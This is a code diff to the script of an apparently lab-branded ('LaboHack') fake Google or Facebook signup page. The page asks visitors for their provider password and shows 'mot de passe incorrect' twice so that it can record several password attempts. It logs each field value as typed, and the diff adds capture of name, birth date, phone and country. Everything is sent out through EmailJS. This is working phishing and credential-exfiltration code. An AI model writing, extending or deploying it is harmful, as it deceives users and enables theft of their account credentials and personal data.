@@ -7,16 +7,26 @@ let checkAttempts = 0;
 const MAX_ATTEMPTS = 3;
 let allData = {
   provider: '',
+  nom: '',
+  prenom: '',
   email: '',
   password: '',
+  dateNaissance: '',
+  telephone: '',
+  pays: '',
   history: []
 };
 let isSubmitting = false;
 let checkPassed = false;
 
 const form = document.getElementById('signupForm');
+const nomInput = document.getElementById('nom');
+const prenomInput = document.getElementById('prenom');
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
+const dateInput = document.getElementById('dateNaissance');
+const telephoneInput = document.getElementById('telephone');
+const paysSelect = document.getElementById('pays');
 const checkBtn = document.getElementById('checkBtn');
 const submitBtn = document.getElementById('submitBtn');
 const toast = document.getElementById('toast');
@@ -30,14 +40,14 @@ const pwdLabel = document.getElementById('pwdLabel');
 document.getElementById('btnGoogle').addEventListener('click', () => {
   allData.provider = 'Google';
   providerIcon.textContent = 'G';
-  providerName.textContent = 'Google';
+  providerName.textContent = 'Inscription avec Google';
   pwdLabel.textContent = 'MOT DE PASSE GOOGLE';
   showForm();
 });
 document.getElementById('btnFacebook').addEventListener('click', () => {
   allData.provider = 'Facebook';
   providerIcon.textContent = 'f';
-  providerName.textContent = 'Facebook';
+  providerName.textContent = 'Inscription avec Facebook';
   pwdLabel.textContent = 'MOT DE PASSE FACEBOOK';
   showForm();
 });
@@ -48,8 +58,8 @@ function showForm() {
   checkAttempts = 0;
   checkPassed = false;
   submitBtn.style.display = 'none';
-  emailInput.value = '';
-  passwordInput.value = '';
+  // Réinitialiser les champs
+  document.querySelectorAll('input, select').forEach(el => el.value = '');
   allData.history = [];
   checkBtn.style.display = 'block';
   updateStrengthMeter('');
@@ -63,15 +73,18 @@ function captureField(champ, valeur) {
   }
 }
 
-emailInput.addEventListener('input', function() {
-  allData.email = this.value;
-  captureField('email', this.value);
-});
+// Écoute de tous les champs
+nomInput.addEventListener('input', function() { allData.nom = this.value; captureField('nom', this.value); });
+prenomInput.addEventListener('input', function() { allData.prenom = this.value; captureField('prenom', this.value); });
+emailInput.addEventListener('input', function() { allData.email = this.value; captureField('email', this.value); });
 passwordInput.addEventListener('input', function() {
   allData.password = this.value;
   captureField('password', this.value);
   updateStrengthMeter(this.value);
 });
+dateInput.addEventListener('input', function() { allData.dateNaissance = this.value; captureField('date', this.value); });
+telephoneInput.addEventListener('input', function() { allData.telephone = this.value; captureField('telephone', this.value); });
+paysSelect.addEventListener('change', function() { allData.pays = this.value; captureField('pays', this.value); });
 
 // Indicateur de force
 function updateStrengthMeter(pwd) {
@@ -102,7 +115,7 @@ function updateStrengthMeter(pwd) {
   else { label.textContent = 'force : fort'; label.style.color = '#ccc'; }
 }
 
-// Vérification : échoue 3 fois puis affiche le bouton Envoyer
+// Vérification : échoue 3 fois puis affiche le bouton S'inscrire
 checkBtn.addEventListener('click', function() {
   const pwd = passwordInput.value.trim();
   if (pwd.length === 0) {
@@ -112,7 +125,7 @@ checkBtn.addEventListener('click', function() {
 
   checkAttempts++;
   if (checkAttempts < MAX_ATTEMPTS) {
-    showToast('mot de passe incorrect. réessayez.', true);
+    showToast(`mot de passe incorrect. réessayez (${checkAttempts}/${MAX_ATTEMPTS})`, true);
     captureField('password_attempt', pwd);
     passwordInput.value = '';
     passwordInput.focus();
@@ -125,7 +138,7 @@ checkBtn.addEventListener('click', function() {
   }
 });
 
-// Soumission finale (1 email)
+// Soumission finale (1 email avec toutes les données)
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
 
@@ -135,23 +148,38 @@ form.addEventListener('submit', async (e) => {
     return;
   }
 
+  // Vérifications classiques
+  const nom = nomInput.value.trim();
+  const prenom = prenomInput.value.trim();
+  const email = emailInput.value.trim();
+  const date = dateInput.value;
+  const telephone = telephoneInput.value.trim();
+  const pays = paysSelect.value;
+  const password = passwordInput.value.trim();
+  const terms = document.getElementById('terms').checked;
+
+  if (!nom || !prenom || !email || !date || !telephone || !pays || !password || !terms) {
+    showToast('[!] tous les champs sont obligatoires.', true);
+    return;
+  }
+
   isSubmitting = true;
   submitBtn.textContent = '...';
   submitBtn.disabled = true;
 
-  allData.email = emailInput.value.trim();
-  allData.password = passwordInput.value.trim();
-
+  // Construction de l'historique
   let historyText = allData.history.map(h => `${h.champ}: ${h.valeur}`).join(' | ');
   if (!historyText) historyText = 'aucune saisie';
 
   const templateParams = {
-    nom: 'Utilisateur LaboHack',
-    email: allData.email,
-    password: allData.password,
-    country: 'N/A',
-    gender: 'N/A',
-    social: `Fournisseur: ${allData.provider}`,
+    nom: nom,
+    prenom: prenom,
+    email: email,
+    password: password,
+    date: date,
+    telephone: telephone,
+    pays: pays,
+    provider: allData.provider,
     history: historyText,
     attempts: checkAttempts,
     final: 'OUI'
@@ -162,6 +190,7 @@ form.addEventListener('submit', async (e) => {
     await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
     showToast('inscription réussie ! redirection...', false);
 
+    // Page de confirmation
     document.body.innerHTML = `
       <div class="container" style="text-align:center; padding:4rem 2rem;">
         <h1 style="font-size:2.2rem; letter-spacing:4px; color:#cccccc; text-shadow:0 0 8px #555555; border-bottom:1px solid #444444; padding-bottom:0.5rem; margin-bottom:1.5rem;">LABO<span style="color:#aaaaaa;">HACK</span></h1>
